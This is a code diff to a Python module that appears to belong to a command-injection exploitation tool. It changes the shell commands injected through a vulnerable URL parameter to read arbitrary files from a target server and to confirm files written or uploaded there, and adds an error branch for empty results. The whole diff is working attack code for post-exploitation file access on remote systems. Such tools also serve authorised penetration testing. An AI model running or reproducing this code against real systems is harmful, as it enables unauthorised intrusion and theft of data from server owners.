@@ -34,7 +34,7 @@ def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_para
   if menu.options.file_read:
     file_to_read = menu.options.file_read
     # Execute command
-    cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
+    cmd = "(" + settings.FILE_READ + file_to_read + ")"
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
     shell = eb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
@@ -80,16 +80,20 @@ def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_para
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
-    cmd = "echo $(ls " + dest_to_write + ")"
+    cmd = "(ls " + dest_to_write + ")"
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
     shell = eb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
     
     if shell:
-      if menu.options.verbose:
-        print ""
-      sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
-      sys.stdout.flush()
+      if len(shell) <= 1:
+       sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you can't create the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n")
+       sys.stdout.flush()
+      else:
+        if menu.options.verbose:
+          print ""
+        sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
+        sys.stdout.flush()
     else:
      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n")
      sys.stdout.flush()
@@ -122,16 +126,20 @@ def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_para
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
-    cmd = "echo $(ls " + dest_to_upload + ")"
+    cmd = "(ls " + dest_to_upload + ")"
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
     shell = eb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
     
     if shell:
-      if menu.options.verbose:
-        print ""
-      sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!\n" + Style.RESET_ALL)
-      sys.stdout.flush()
+      if len(shell) <= 1:
+       sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you can't create the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n")
+       sys.stdout.flush()
+      else:
+        if menu.options.verbose:
+          print ""
+        sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!\n" + Style.RESET_ALL)
+        sys.stdout.flush()
     else:
      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n")
      sys.stdout.flush()
